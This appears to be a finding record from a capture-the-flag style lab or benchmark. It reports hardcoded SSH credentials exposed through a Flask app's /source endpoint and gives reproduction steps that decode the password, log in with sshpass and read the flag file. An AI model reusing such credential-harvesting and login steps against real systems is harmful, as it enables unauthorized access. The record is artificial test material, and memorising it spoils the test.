findings.title: Hardcoded SSH Credentials in Flask Application Source Code
findings.description: The Flask application exposes its source code via /source endpoint, revealing hardcoded SSH credentials (username: pedro, password: base64 encoded 'AHeavySandbag' + '!'). The SSH server on port 55612 accepts password authentication, allowing full access to the container.

reproduction.command:
1. Access http://172.17.0.1:55611/source to view source code
2. Decode base64 password: echo 'QUhlYXZ5U2FuZGJhZw==' | base64 -d → 'AHeavySandbag'
3. Add '!' suffix: password = 'AHeavySandbag!'
4. SSH to port 55612: sshpass -p 'AHeavySandbag!' ssh pedro@172.17.0.1 -p 55612
5. Read flag: cat /home/pedro/FLAG.txt
